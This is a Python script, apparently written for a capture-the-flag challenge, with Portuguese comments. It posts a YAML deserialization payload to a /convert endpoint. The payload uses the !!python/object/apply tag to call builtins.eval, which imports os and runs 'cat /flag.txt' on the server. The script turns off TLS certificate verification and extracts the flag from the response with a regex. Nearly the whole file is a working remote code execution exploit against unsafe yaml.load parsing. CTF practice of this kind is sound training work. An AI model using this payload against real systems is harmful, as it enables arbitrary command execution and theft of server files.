#!/usr/bin/env python3
import json
import re
import ssl
import urllib.request
import urllib.error

# Alvo confirmado via curl:
# HTTPS responde 200 OK em /health.
TARGET = "ab63e65a47096f46.chal.ctf.ae"
URL = f"https://{TARGET}/convert"

# Contexto SSL sem validação estrita de certificado.
# Equivalente ao curl -k.
ssl_context = ssl._create_unverified_context()

# Payload YAML para explorar yaml.load(..., Loader=yaml.Loader).
#
# A tag !!python/object/apply permite chamar funções Python durante o parsing.
# Chamamos builtins.eval e passamos uma expressão Python.
# A expressão importa os, executa "cat /flag.txt" no sistema e retorna o conteúdo.
payload = """!!python/object/apply:builtins.eval
- "__import__('os').popen('cat /flag.txt').read()"
"""

# A rota /convert espera JSON com o campo yaml_input.
body = json.dumps({
    "yaml_input": payload
}).encode()

headers = {
    "Content-Type": "application/json",
    "User-Agent": "yaml-ctf-client/2.0"
}

print(f"[*] Enviando payload para {URL}")
print()
print("=" * 80)
print("PAYLOAD YAML")
print("=" * 80)
print(payload)

req = urllib.request.Request(
    URL,
    data=body,
    headers=headers,
    method="POST"
)

try:
    with urllib.request.urlopen(req, timeout=20, context=ssl_context) as resp:
        status = resp.status
        raw = resp.read().decode(errors="replace")
except urllib.error.HTTPError as e:
    status = e.code
    raw = e.read().decode(errors="replace")
except Exception as e:
    print(f"[-] Erro na conexão: {e}")
    raise SystemExit(1)

print()
print("=" * 80)
print("RESPOSTA HTTP")
print("=" * 80)
print(f"Status: {status}")
print(raw)

# Extração automática da flag dentro da resposta bruta.
match = re.search(r"flag\{[^}\r\n]+\}", raw, re.IGNORECASE)

print()
print("=" * 80)
print("RESULTADO")
print("=" * 80)

if match:
    flag = match.group(0)
    print(f"[+] FLAG ENCONTRADA: {flag}")

    with open("flag.txt", "w", encoding="utf-8") as f:
        f.write(flag + "\n")

    print("[+] Flag salva em flag.txt")
    raise SystemExit(0)

print("[-] Flag não encontrada automaticamente.")
print("[*] Verifique a resposta acima para erro de payload ou filtragem.")
raise SystemExit(2)
